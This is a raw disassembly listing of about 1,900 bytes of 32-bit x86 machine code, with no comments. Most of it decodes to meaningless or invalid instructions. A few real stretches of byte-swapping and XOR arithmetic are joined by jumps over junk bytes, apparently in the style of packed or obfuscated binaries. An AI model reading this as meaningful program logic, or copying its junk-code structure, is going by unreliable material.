  40c826:	fdiv   st,st(6)
  40c828:	push   eax
  40c829:	or     bl,0x2a
  40c82c:	jne    0x40c7d0
  40c82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82f:	dec    ebp
  40c830:	xlat   BYTE PTR ds:[ebx]
  40c831:	ficom  DWORD PTR [edx+0x4a]
  40c834:	adc    ah,ah
  40c836:	unpcklps xmm1,XMMWORD PTR [ebx+edx*1-0x6d09dd90]
  40c83e:	jecxz  0x40c89e
  40c840:	push   ds
  40c841:	sub    BYTE PTR [ecx+0x2dc4935a],dl
  40c847:	jge    0x40c810
  40c849:	xor    esi,DWORD PTR [ecx-0x40]
  40c84c:	dec    eax
  40c84d:	mov    ah,0x4a
  40c84f:	leave  
  40c850:	pop    ss
  40c851:	(bad)  
  40c852:	sbb    al,BYTE PTR [ecx+0x30]
  40c855:	test   al,0x38
  40c857:	test   BYTE PTR [esi+eax*1],dl
  40c85a:	sbb    al,0xaa
  40c85c:	jne    0x40c7ef
  40c85e:	pop    eax
  40c85f:	leave  
  40c860:	cmp    DWORD PTR [ecx-0x26b579c3],ecx
  40c866:	and    esi,eax
  40c868:	rol    bh,1
  40c86a:	retf   0x5d4e
  40c86d:	mov    ds:0x2cbe103,al
  40c872:	jmp    0x40c7f4
  40c874:	dec    ebp
  40c875:	ror    DWORD PTR [edx+0x26cbf673],0x1d
  40c87c:	mov    esp,0x13a48c1f
  40c881:	sub    eax,0x1e006e56
  40c886:	adc    eax,0x4cff5b2d
  40c88b:	and    bl,BYTE PTR [ecx+0x31]
  40c88e:	xchg   ecx,eax
  40c88f:	mov    ch,0x18
  40c891:	lods   al,BYTE PTR ds:[esi]
  40c892:	sub    al,0xc9
  40c894:	and    eax,0x2132c5c3
  40c899:	jo     0x40c8e4
  40c89b:	push   ds
  40c89c:	mov    edx,0x5a665953
  40c8a1:	test   al,0x2a
  40c8a3:	rcl    DWORD PTR [esi],cl
  40c8a5:	popa   
  40c8a6:	pop    edx
  40c8a7:	xor    cl,dh
  40c8a9:	mov    ch,0x51
  40c8ab:	xchg   esp,eax
  40c8ac:	stc    
  40c8ad:	adc    eax,0x9102f0c6
  40c8b2:	(bad)  
  40c8b3:	rcl    BYTE PTR [ebx+0x55],1
  40c8b6:	mov    ebp,0x182ed0b6
  40c8bb:	nop
  40c8bc:	sub    ah,cl
  40c8be:	jno    0x40c89f
  40c8c0:	enter  0x59ed,0xa9
  40c8c4:	ret    
  40c8c5:	mov    edx,0x5e7ed1fb
  40c8ca:	add    ecx,DWORD PTR [ebp+eiz*2-0x57]
  40c8ce:	xor    BYTE PTR [edi-0x7249614c],dl
  40c8d4:	and    al,0x61
  40c8d6:	(bad)  
  40c8d7:	push   ss
  40c8d8:	xor    ebp,eax
  40c8da:	aad    0x6a
  40c8dc:	dec    DWORD PTR [esi-0x4d]
  40c8df:	push   eax
  40c8e0:	jmp    0xb4f3:0x12b921c7
  40c8e7:	push   ebp
  40c8e8:	addr16 jle 0x40c906
  40c8eb:	test   eax,0xb73dd433
  40c8f0:	jmp    0x40c87a
  40c8f2:	xor    BYTE PTR cs:[esi+0x416c7a38],bh
  40c8f9:	fist   WORD PTR [ebx-0x21]
  40c8fc:	dec    edi
  40c8fd:	mov    edi,0x2b9b2244
  40c902:	push   eax
  40c903:	mov    bl,0x59
  40c905:	and    eax,DWORD PTR [edx+0x4]
  40c908:	imul   ebx,esp,0x5e
  40c90b:	xchg   esi,eax
  40c90c:	imul   esp,DWORD PTR [ebx+0x41],0x56
  40c910:	cli    
  40c911:	cmp    eax,DWORD PTR [eax]
  40c913:	arpl   WORD PTR [ebx-0xcad9d43],bp
  40c919:	mov    edx,ebp
  40c91b:	cmp    eax,0x42a43ce3
  40c920:	adc    DWORD PTR [edx-0x44f9a1b9],0xffffffd0
  40c927:	sar    DWORD PTR [esi],cl
  40c929:	xor    BYTE PTR ss:[edx-0x12],ah
  40c92d:	push   cs
  40c92e:	jmp    0x377ccab2
  40c933:	mov    cl,0xe9
  40c935:	mov    bl,0xef
  40c937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c938:	sub    DWORD PTR ds:0x7ea349b1,ebp
  40c93e:	sti    
  40c93f:	loop   0x40c8cd
  40c941:	dec    esp
  40c942:	mov    dl,0xc1
  40c944:	mov    dl,0x3
  40c946:	push   ebp
  40c947:	in     al,dx
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	psubb  mm6,QWORD PTR [eax-0x6d3526f9]
  40c9a4:	jle    0x40ca24
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	imul   esi,DWORD PTR [ebp+0x392bf89e],0xa1d9ea87
  40c9b4:	or     DWORD PTR ds:0xa69da985,eax
  40c9ba:	(bad)  
  40c9bb:	pop    esp
  40c9bc:	es jns 0x40c966
  40c9bf:	in     eax,dx
  40c9c0:	data16 xor BYTE PTR [edi+edx*1],ah
  40c9c4:	scas   al,BYTE PTR es:[edi]
  40c9c5:	test   al,0xe
  40c9c7:	or     eax,0x8470d8b0
  40c9cc:	mov    esp,fs
  40c9ce:	lahf   
  40c9cf:	es or  cl,bl
  40c9d2:	inc    edx
  40c9d3:	mov    edi,0x3f104ca9
  40c9d8:	dec    edi
  40c9d9:	pusha  
  40c9da:	into   
  40c9db:	dec    edx
  40c9dc:	inc    ebp
  40c9dd:	call   0xb396:0x65b480c0
  40c9e4:	cld    
  40c9e5:	retf   
  40c9e6:	test   al,0x19
  40c9e8:	add    eax,0xf25feea3
  40c9ed:	ret    
  40c9ee:	xchg   edi,eax
  40c9ef:	sub    al,0x37
  40c9f1:	retf   
  40c9f2:	sbb    dh,BYTE PTR [ebx+0x27]
  40c9f5:	pop    ds
  40c9f6:	call   0x19d7:0x8aadac4
  40c9fd:	loopne 0x40ca30
  40c9ff:	mov    esi,0x33070ec1
  40ca04:	fs das 
  40ca06:	push   0x43f5f8f8
  40ca0b:	addr16 pop ss
  40ca0d:	mov    bh,0x87
  40ca0f:	sub    bl,0xce
  40ca12:	xor    eax,0xe8b28eeb
  40ca17:	sahf   
  40ca18:	retf   0x14c4
  40ca1b:	int3   
  40ca1c:	clc    
  40ca1d:	retf   
  40ca1e:	sub    esi,edx
  40ca20:	jecxz  0x40c9eb
  40ca22:	icebp  
  40ca23:	dec    ebx
  40ca24:	xor    al,0xd2
  40ca26:	ja     0x40ca4b
  40ca28:	push   0xfb68b7ee
  40ca2d:	cmp    DWORD PTR [eax*4+0x3a222453],esp
  40ca34:	jecxz  0x40ca80
  40ca36:	sub    al,0x89
  40ca38:	cmp    DWORD PTR [edx],edx
  40ca3a:	dec    ecx
  40ca3b:	xchg   ebx,eax
  40ca3c:	imul   BYTE PTR [ebp-0x41]
  40ca3f:	test   al,0x60
  40ca41:	add    eax,0xed8e2c63
  40ca46:	mov    bl,0x9e
  40ca48:	jns    0x40c9ce
  40ca4a:	lds    ecx,FWORD PTR [esi-0x50]
  40ca4d:	adc    eax,0x91ef607f
  40ca52:	pop    ecx
  40ca53:	sub    dh,bl
  40ca55:	test   DWORD PTR [eax-0x54d782c6],edx
  40ca5b:	sbb    eax,0x3154e55f
  40ca60:	push   edx
  40ca61:	sub    BYTE PTR [eax-0x7b],bh
  40ca64:	mov    dh,0x7a
  40ca66:	pushf  
  40ca67:	sub    al,0x47
  40ca69:	retf   0x81ae
  40ca6c:	retf   0x7017
  40ca6f:	fcomp  DWORD PTR [eax-0x751665bc]
  40ca75:	dec    ebx
  40ca76:	sbb    eax,0xc2205904
  40ca7b:	pop    edi
  40ca7c:	shl    BYTE PTR [ebx],0x0
  40ca7f:	and    DWORD PTR [eax-0x4d],0xe
  40ca83:	mov    eax,0x9581cf89
  40ca88:	xor    BYTE PTR [esi+edx*8-0x1fd00807],dh
  40ca8f:	(bad)  
  40ca90:	inc    esp
  40ca91:	ja     0x40ca60
  40ca93:	int    0x82
  40ca95:	adc    ah,BYTE PTR [edx-0x5ea6017f]
  40ca9b:	push   es
  40ca9c:	test   eax,0x9ae74547
  40caa1:	mov    ss,WORD PTR [ecx+esi*1-0x72ff9c9e]
  40caa8:	scas   eax,DWORD PTR es:[edi]
  40caa9:	ror    DWORD PTR [edi],1
  40caab:	pop    es
  40caac:	scas   eax,DWORD PTR es:[edi]
  40caad:	test   ch,cl
  40caaf:	pop    es
  40cab0:	adc    ebx,DWORD PTR [ebx+0x5a]
  40cab3:	mov    ds:0x4816ad2b,eax
  40cab8:	sub    DWORD PTR [ecx-0x18],esp
  40cabb:	dec    edi
  40cabc:	montmul (bad)
  40cabd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cabe:	test   BYTE PTR [ebp+0x57],bh
  40cac1:	mov    dl,0xe1
  40cac3:	mov    WORD PTR [ecx],ds
  40cac5:	rcr    BYTE PTR [ecx+0x77],1
  40cac8:	mov    dl,BYTE PTR [ebp-0x6b]
  40cacb:	lock add al,0x22
  40cace:	sub    al,0x7b
  40cad0:	sub    dl,dl
  40cad2:	les    esi,FWORD PTR [edx]
  40cad4:	xor    eax,0xcc9541f2
  40cad9:	sub    BYTE PTR [ebp+0x3f],dh
  40cadc:	stos   DWORD PTR es:[edi],eax
  40cadd:	ds in  eax,dx
  40cadf:	fild   QWORD PTR [ecx-0x6b617e09]
  40cae5:	push   edx
  40cae6:	sbb    edx,DWORD PTR [ebx]
  40cae8:	add    ebx,DWORD PTR [eax+0x4919af38]
  40caee:	cmp    al,0xd
  40caf0:	jg     0x40caed
  40caf2:	inc    esi
  40caf3:	call   0xaacf89ef
  40caf8:	or     BYTE PTR [edx],dl
  40cafa:	neg    edi
  40cafc:	xor    al,0x29
  40cafe:	scas   al,BYTE PTR es:[edi]
  40caff:	cld    
  40cb00:	clc    
  40cb01:	in     eax,0x4f
  40cb03:	rol    DWORD PTR [edi-0x5483f096],0xe9
  40cb0a:	cmp    esp,DWORD PTR [ecx+ebp*8]
  40cb0d:	mov    dl,0xa8
  40cb0f:	inc    ebp
  40cb10:	sub    DWORD PTR [ebx+0x61b50dfc],esi
  40cb16:	pop    edi
  40cb17:	pop    es
  40cb18:	pop    ebp
  40cb19:	mov    DWORD PTR [esi],ebp
  40cb1b:	inc    ebx
  40cb1c:	or     edx,DWORD PTR [ecx-0x59469f27]
  40cb22:	push   edx
  40cb23:	retf   
  40cb24:	add    eax,ebx
  40cb26:	enter  0x4a89,0x4a
  40cb2a:	sahf   
  40cb2b:	jne    0x40cac4
  40cb2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb2e:	inc    edx
  40cb2f:	inc    eax
  40cb30:	fwait
  40cb31:	push   edi
  40cb32:	outs   dx,BYTE PTR ds:[esi]
  40cb33:	xchg   BYTE PTR [edx+0x5d],dl
  40cb36:	mov    esp,0xc3c136e2
  40cb3b:	cmc    
  40cb3c:	xor    DWORD PTR [edi+edi*8],eax
  40cb3f:	pop    ebx
  40cb40:	jg     0x40cb8f
  40cb42:	adc    dh,bh
  40cb44:	adc    ebp,DWORD PTR [edi-0x1a]
  40cb47:	mov    eax,ds:0xbaab0efb
  40cb4c:	icebp  
  40cb4d:	out    0xac,eax
  40cb4f:	clc    
  40cb50:	add    ebx,DWORD PTR ds:[edi+ebx*1]
  40cb54:	stc    
  40cb55:	cmp    al,al
  40cb57:	jb     0x40cb02
  40cb59:	arpl   WORD PTR [ecx-0x4f],bx
  40cb5c:	dec    ebx
  40cb5d:	jmp    0x3ba4:0xef41da74
  40cb64:	adc    bl,BYTE PTR [edi]
  40cb66:	push   es
  40cb67:	pusha  
  40cb68:	jmp    0x40cb14
  40cb6a:	sub    bl,BYTE PTR [ebp+0x59]
  40cb6d:	sub    al,0x44
  40cb6f:	jbe    0x40cbb9
  40cb71:	out    0xdc,al
  40cb73:	inc    esi
  40cb74:	pop    ebx
  40cb75:	gs cmp al,0xef
  40cb78:	and    bh,BYTE PTR [ebp-0x138a1239]
  40cb7e:	popa   
  40cb7f:	sbb    BYTE PTR [edx-0x404625f4],cl
  40cb85:	inc    DWORD PTR [ebx+0x49]
  40cb88:	fstp   TBYTE PTR [edi]
  40cb8a:	pop    ds
  40cb8b:	test   DWORD PTR [eax-0x4b],0xf2077348
  40cb92:	xor    DWORD PTR [ebp-0x285b7ffc],ecx
  40cb98:	inc    ebp
  40cb99:	ins    DWORD PTR es:[edi],dx
  40cb9a:	cmc    
  40cb9b:	rcl    DWORD PTR [ebx],0xcc
  40cb9e:	push   edi
  40cb9f:	mov    eax,ds:0xa8174afd
  40cba4:	mov    ds:0x90148cd6,al
  40cba9:	sub    DWORD PTR [eax+0x11],ecx
  40cbac:	ds stos BYTE PTR es:[edi],al
  40cbae:	and    al,0x8b
  40cbb0:	cmp    DWORD PTR ds:[esi+0x7371f4b1],eax
  40cbb7:	jnp    0x40cbfb
  40cbb9:	or     dh,bh
  40cbbb:	call   0x3b6bff37
  40cbc0:	iret   
  40cbc1:	scas   al,BYTE PTR es:[edi]
  40cbc2:	adc    edi,DWORD PTR [esi]
  40cbc4:	inc    ecx
  40cbc5:	pop    ss
  40cbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbc7:	jae    0x40cb98
  40cbc9:	ror    BYTE PTR [esi+esi*8-0x6b],0xd4
  40cbce:	mov    dl,0xf9
  40cbd0:	push   ds
  40cbd1:	cmp    edi,DWORD PTR [ebx-0x67]
  40cbd4:	shl    BYTE PTR [ebp-0x5b5dec66],0xc3
  40cbdb:	popf   
  40cbdc:	je     0x40cbc6
  40cbde:	jge    0x40cbae
  40cbe0:	mov    ds:0x84d99326,al
  40cbe5:	inc    edi
  40cbe6:	imul   esp,esi,0x6c514992
  40cbec:	shl    DWORD PTR [edi+0x66],1
  40cbef:	mov    cl,0xde
  40cbf1:	mov    ebx,0xa320926e
  40cbf6:	cld    
  40cbf7:	and    dh,BYTE PTR [ecx+0x42ea8cf6]
  40cbfd:	xchg   BYTE PTR [esi],ah
  40cbff:	test   al,0xc9
  40cc01:	lahf   
  40cc02:	push   esp
  40cc03:	dec    DWORD PTR [edi]
  40cc05:	push   0xffffffb4
  40cc07:	adc    eax,0xf8509068
  40cc0c:	loopne 0x40cb9f
  40cc0e:	js     0x40cbfa
  40cc10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc11:	aas    
  40cc12:	iret   
  40cc13:	pusha  
  40cc14:	sub    eax,0x7573ff1
  40cc19:	ds lahf 
  40cc1b:	(bad)  
  40cc1c:	sub    al,0x28
  40cc1e:	dec    esp
  40cc1f:	add    eax,0x7ec147ed
  40cc24:	out    dx,eax
  40cc25:	mov    bh,0xa9
  40cc27:	int3   
  40cc28:	fisubr DWORD PTR [ebx-0x4ab28652]
  40cc2e:	inc    eax
  40cc2f:	jl     0x40cbd8
  40cc31:	jle    0x40cc02
  40cc33:	mov    bl,0x42
  40cc35:	cmp    cl,BYTE PTR [ebx]
  40cc37:	adc    eax,DWORD PTR ds:0x2c39a2b4
  40cc3d:	or     ah,BYTE PTR [eax-0x70]
  40cc40:	or     dl,0xc6
  40cc43:	enter  0x10cf,0xfb
  40cc47:	cmp    esp,esp
  40cc49:	fcom   DWORD PTR [ecx+0x47]
  40cc4c:	bound  eax,QWORD PTR [ebx-0x519d3b06]
  40cc52:	pop    es
  40cc53:	jmp    0x40ccc2
  40cc55:	lods   eax,DWORD PTR ds:[esi]
  40cc56:	pop    edi
  40cc57:	add    BYTE PTR [edi-0x13],0x1a
  40cc5b:	call   0x16bb:0xadb3fdbd
  40cc62:	or     al,0x87
  40cc64:	mov    eax,ds:0xaeacf727
  40cc69:	call   FWORD PTR [eax-0x2a2d8634]
  40cc6f:	arpl   ax,di
  40cc71:	push   es
  40cc72:	stc    
  40cc73:	sub    eax,0x5feaf33b
  40cc78:	arpl   WORD PTR [edx+ebp*4],si
  40cc7b:	dec    ebp
  40cc7c:	sbb    DWORD PTR [ecx+edi*8+0x284b66f8],ebp
  40cc83:	jecxz  0x40cc15
  40cc85:	nop
  40cc86:	and    eax,0x7103948c
  40cc8b:	cwde   
  40cc8c:	in     al,0x21
  40cc8e:	into   
  40cc8f:	pop    ecx
  40cc90:	cwde   
  40cc91:	std    
  40cc92:	inc    edx
  40cc93:	xor    bl,cl
  40cc95:	imul   ebp,DWORD PTR [edi+0x49fe6f3a],0xffffffa5
  40cc9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc9d:	gs dec esi
  40cc9f:	cwde   
  40cca0:	jle    0x40ccb0
  40cca2:	dec    edi
  40cca3:	mov    dl,0x8e
  40cca5:	jmp    0xc67:0x80e1185f
  40ccac:	ins    DWORD PTR es:[edi],dx
  40ccad:	push   cs
  40ccae:	outs   dx,DWORD PTR ds:[esi]
  40ccaf:	sbb    al,al
  40ccb1:	std    
  40ccb2:	sti    
  40ccb3:	out    dx,al
  40ccb4:	adc    BYTE PTR ds:0xadc2301d,cl
  40ccba:	clc    
  40ccbb:	xchg   ebx,eax
  40ccbc:	mul    DWORD PTR [ecx+edi*4+0x2d]
  40ccc0:	xchg   DWORD PTR [esi+0x6e7d9a34],ebp
  40ccc6:	jb     0x40ccec
  40ccc8:	inc    ecx
  40ccc9:	sbb    DWORD PTR fs:[edi+0x77],esp
  40cccd:	xchg   BYTE PTR [edi-0x1608c875],bl
  40ccd3:	pop    ecx
  40ccd4:	cld    
  40ccd5:	inc    esi
  40ccd6:	jne    0x40cc71
  40ccd8:	in     al,dx
  40ccd9:	add    al,0x26
  40ccdb:	mov    eax,0x640c652f
  40cce0:	mov    dl,0xd0
  40cce2:	jmp    0xaab7:0x4bdb93dd
  40cce9:	jmp    0x40ccb2
  40cceb:	(bad)  
  40ccec:	mov    BYTE PTR [edi],dh
  40ccee:	and    eax,DWORD PTR [edi+0x3d]
  40ccf1:	mov    ah,0x27
  40ccf3:	call   0xd840:0xf9624560
  40ccfa:	mov    esi,ebx
  40ccfc:	arpl   WORD PTR [eax+ecx*8-0x1df268e7],dx
  40cd03:	aas    
  40cd04:	pop    edi
  40cd05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd06:	test   BYTE PTR [ebx-0x2cc6f75d],0x34
  40cd0d:	leave  
  40cd0e:	xchg   ecx,esi
  40cd10:	xor    eax,0xa4ba0fa
  40cd15:	push   esp
  40cd16:	ret    0x2d27
  40cd19:	cmc    
  40cd1a:	xor    eax,0x6ee6bc3c
  40cd1f:	fwait
  40cd20:	daa    
  40cd21:	int    0x7a
  40cd23:	pop    ss
  40cd24:	test   DWORD PTR [ebp-0x24],0xa8978eda
  40cd2b:	dec    edx
  40cd2c:	retf   
  40cd2d:	fiadd  WORD PTR [eax]
  40cd2f:	jne    0x40cd0c
  40cd31:	inc    edi
  40cd32:	gs pushf 
  40cd34:	mov    ah,0x22
  40cd36:	daa    
  40cd37:	push   ds
  40cd38:	mov    ds:0x1419405d,al
  40cd3d:	push   es
  40cd3e:	clc    
  40cd3f:	jb     0x40cd58
  40cd41:	pop    ss
  40cd42:	add    eax,0x340dec6e
  40cd47:	dec    edx
  40cd48:	fs pop ebp
  40cd4a:	xchg   esp,eax
  40cd4b:	mov    edx,0x5215ee25
  40cd50:	cli    
  40cd51:	cli    
  40cd52:	add    edx,DWORD PTR [ebx]
  40cd54:	mov    edx,0x790afb34
  40cd59:	sbb    ecx,edi
  40cd5b:	loop   0x40cd8e
  40cd5d:	stc    
  40cd5e:	jae    0x40cdd9
  40cd60:	jnp    0x40cdaf
  40cd62:	xor    al,0x98
  40cd64:	cmp    eax,0xa4f661b5
  40cd69:	cmc    
  40cd6a:	and    BYTE PTR [bx+si],ah
  40cd6d:	cs jno 0x40cd10
  40cd70:	ffree  st(3)
  40cd72:	xchg   esi,eax
  40cd73:	cmp    al,0x48
  40cd75:	push   esi
  40cd76:	shr    dl,cl
  40cd78:	add    BYTE PTR [edi+0x4a],ch
  40cd7b:	cli    
  40cd7c:	push   eax
  40cd7d:	push   edi
  40cd7e:	xchg   edi,eax
  40cd7f:	js     0x40cdf4
  40cd81:	fadd   DWORD PTR [edx+0x6d]
  40cd84:	mov    edi,0x16e802b
  40cd89:	pop    ebp
  40cd8a:	out    0x5b,al
  40cd8c:	and    al,dh
  40cd8e:	inc    eax
  40cd8f:	jmp    0x15cc:0x91d5d04e
  40cd96:	jae    0x40cdbd
  40cd98:	fbld   TBYTE PTR [eax+0x1c7a9cd7]
  40cd9e:	rcl    BYTE PTR [ecx-0x8],1
  40cda1:	fisub  WORD PTR [edi]
  40cda3:	je     0x40cd2d
  40cda5:	xchg   esp,eax
  40cda6:	pop    ds
  40cda7:	cdq    
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	xor    DWORD PTR [ecx-0x53],esp
  40cddc:	pop    edx
  40cddd:	int3   
  40cdde:	sahf   
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	mov    WORD PTR [edx],gs
  40cde7:	jne    0x40cdb5
  40cde9:	dec    ecx
  40cdea:	dec    esi
  40cdeb:	mov    dl,0x61
  40cded:	pop    esi
  40cdee:	out    dx,eax
  40cdef:	ror    DWORD PTR [edi],cl
  40cdf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdf2:	sub    edi,DWORD PTR [esi-0x48]
  40cdf5:	mov    esp,0x77f96d13
  40cdfa:	mov    edi,0x77eef684
  40cdff:	jbe    0x40cda4
  40ce01:	in     eax,dx
  40ce02:	jg     0x40cdab
  40ce04:	popa   
  40ce05:	sbb    eax,DWORD PTR [edx]
  40ce07:	int3   
  40ce08:	adc    ebx,edi
  40ce0a:	pusha  
  40ce0b:	xor    BYTE PTR [esp+ecx*2],cl
  40ce0e:	leave  
  40ce0f:	pop    ecx
  40ce10:	mov    edx,0x93449d13
  40ce15:	iret   
  40ce16:	daa    
  40ce17:	outs   dx,DWORD PTR cs:[esi]
  40ce19:	or     DWORD PTR [eax+ebx*2-0x6],edi
  40ce1d:	(bad)  
  40ce1e:	mov    bl,0xaa
  40ce20:	xor    BYTE PTR [esi+0x3df8b8ec],cl
  40ce26:	lock imul edi,edx,0xa5191196
  40ce2d:	inc    eax
  40ce2e:	cli    
  40ce2f:	mov    dl,0x30
  40ce31:	push   edx
  40ce32:	and    al,0xe
  40ce34:	and    eax,0x6c4cb5c7
  40ce39:	sbb    al,0x95
  40ce3b:	call   0x5dff:0xeb29bc9a
  40ce42:	(bad)  
  40ce43:	xor    dh,BYTE PTR [edi+ebp*8-0x12e6fc0c]
  40ce4a:	fld    st(7)
  40ce4c:	loop   0x40ce9b
  40ce4e:	pop    edi
  40ce4f:	pop    ecx
  40ce50:	pushf  
  40ce51:	sahf   
  40ce52:	sub    DWORD PTR [ebp+0x4773ee3d],ecx
  40ce58:	ja     0x40ce2a
  40ce5a:	cmc    
  40ce5b:	ret    
  40ce5c:	rcl    BYTE PTR [edi],cl
  40ce5e:	mov    al,ds:0x2cfc4fcc
  40ce63:	dec    esp
  40ce64:	dec    ebx
  40ce65:	dec    eax
  40ce66:	call   0x5e7e:0xfc76bc78
  40ce6d:	out    0x51,al
  40ce6f:	popa   
  40ce70:	push   esp
  40ce71:	mov    al,0x89
  40ce73:	jecxz  0x40ce5c
  40ce75:	jg     0x40ce10
  40ce77:	pop    ss
  40ce78:	daa    
  40ce79:	mov    WORD PTR [ebp-0x7],gs
  40ce7c:	push   esi
  40ce7d:	cmp    dh,ch
  40ce7f:	(bad)  
  40ce80:	dec    esp
  40ce81:	out    0x2,eax
  40ce83:	pop    ds
  40ce84:	dec    esi
  40ce85:	dec    eax
  40ce86:	mov    ah,0xf8
  40ce88:	jmp    0x69cb:0x8e3f3bed
  40ce8f:	sub    al,dh
  40ce91:	pop    es
  40ce92:	pop    ds
  40ce93:	jo     0x40ce48
  40ce95:	xchg   ah,bh
  40ce97:	jnp    0x40ce72
  40ce99:	pop    esp
  40ce9a:	nop
  40ce9b:	and    ecx,DWORD PTR [esi]
  40ce9d:	test   BYTE PTR [edx-0x72],dh
  40cea0:	jg     0x40cebf
  40cea2:	pop    cx
  40cea4:	add    eax,ebp
  40cea6:	mov    al,0x22
  40cea8:	pop    ds
  40cea9:	and    DWORD PTR [edi+0x5934cfd4],edx
  40ceaf:	lock pop di
  40ceb2:	fcom   st(2)
  40ceb4:	stos   DWORD PTR es:[edi],eax
  40ceb5:	les    esi,FWORD PTR [ecx-0x33c1a591]
  40cebb:	dec    esi
  40cebc:	cmc    
  40cebd:	in     eax,dx
  40cebe:	popa   
  40cebf:	cmp    DWORD PTR [ebp-0x11],0x76de963c
  40cec6:	fcomp  QWORD PTR cs:[ebx-0x41]
  40ceca:	aaa    
  40cecb:	int3   
  40cecc:	enter  0x8ec,0x76
  40ced0:	and    eax,DWORD PTR [edx+0x23]
  40ced3:	sub    ebx,DWORD PTR [ebp+ecx*8-0x6baffaf4]
  40ceda:	inc    eax
  40cedb:	or     bh,BYTE PTR [ecx-0xc]
  40cede:	sbb    ch,bh
  40cee0:	(bad)  
  40cee2:	xor    DWORD PTR [ecx],0xffffffdb
  40cee5:	sub    eax,0x5fbceb76
  40ceea:	jo     0x40cecf
  40ceec:	inc    edx
  40ceed:	dec    esp
  40ceee:	adc    BYTE PTR [ecx+ecx*8-0x3dcc844],bl
  40cef5:	jg     0x40cf17
  40cef7:	pop    esp
  40cef8:	inc    esp
  40cef9:	cli    
  40cefa:	lds    esp,FWORD PTR [ecx-0x14c951dc]
  40cf00:	iret   
  40cf01:	dec    esp
  40cf02:	enter  0x3b13,0x8
  40cf06:	cmp    al,0xfb
  40cf08:	and    ah,BYTE PTR [edx-0xb]
  40cf0b:	mov    al,0x15
  40cf0d:	fild   QWORD PTR [esp+edx*2+0xc]
  40cf11:	mov    ah,0xed
  40cf13:	js     0x40cf16
  40cf15:	mov    WORD PTR [ecx],gs
  40cf17:	xchg   edi,eax
  40cf18:	pusha  
  40cf19:	sbb    eax,0x80b8892e
  40cf1e:	xchg   esi,eax
  40cf1f:	out    0x1c,al
  40cf21:	sub    edx,DWORD PTR ds:0xc916307b
  40cf27:	or     BYTE PTR [ebx],al
  40cf29:	clc    
  40cf2a:	js     0x40cedd
  40cf2c:	and    eax,0x789f75b4
  40cf31:	pop    ebx
  40cf32:	pop    ss
  40cf33:	xchg   ecx,eax
  40cf34:	les    esp,FWORD PTR [ecx+0x69903437]
  40cf3a:	in     al,0xe1
  40cf3c:	dec    ebp
  40cf3d:	fimul  DWORD PTR [esp+edi*4+0x31]
  40cf41:	mov    BYTE PTR [eax+esi*1+0x255a3acf],dl
  40cf48:	cmp    eax,DWORD PTR [edi]
  40cf4a:	mov    WORD PTR [ebx],?
  40cf4c:	faddp  st(5),st
  40cf4e:	mov    bl,0xa3
  40cf50:	mov    cl,0x9e
  40cf52:	shr    dl,0x71
  40cf55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf56:	cs out 0x90,al
  40cf59:	inc    ecx
  40cf5a:	jg     0x40cfc5
  40cf5c:	push   esi
  40cf5d:	add    eax,0x76ad71df
  40cf62:	mov    dh,0x44
  40cf64:	mov    cl,0x1d
  40cf66:	in     al,0x60
  40cf68:	out    0x1d,eax
  40cf6a:	xor    eax,0x29b277e6
  40cf6f:	jmp    0x22fb:0x6c4882b2
  40cf76:	inc    eax
  40cf77:	fmul   QWORD PTR [edx+0x7a]
  40cf7a:	jnp    0x40cfec
  40cf7c:	cmp    DWORD PTR [eax-0x22f7ba8d],ecx
  40cf82:	or     ax,ax
  40cf85:	jne    0x40cf7c
  40cf87:	fmul   QWORD PTR [ebx]
  40cf89:	pop    edx
  40cf8a:	jno    0x40cf8a
